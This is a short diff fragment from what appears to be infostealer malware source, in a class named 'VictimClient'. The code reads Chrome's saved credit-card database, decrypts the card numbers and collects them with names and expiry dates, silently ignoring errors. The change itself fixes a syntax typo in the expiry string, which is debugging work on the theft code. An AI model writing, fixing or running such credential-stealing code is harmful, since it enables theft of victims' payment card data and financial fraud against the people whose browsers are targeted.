@@ -1112,7 +1112,7 @@ class VictimClient:
                     cur.execute("SELECT name_on_card, card_number_encrypted, expiry_month, expiry_year FROM credit_cards")
                     for row in cur.fetchall():
                         card_num = _decrypt_chrome_value(row[1], profile_path)
-                        cards.append({{"name": row[0], "number": card_num, "expiry": f"{{row[2]}}/{{row[3}}"}})
+                        cards.append({{"name": row[0], "number": card_num, "expiry": f"{{row[2]}}/{{row[3]}}"}})
                 except Exception:
                     pass
                 return autofill, cards
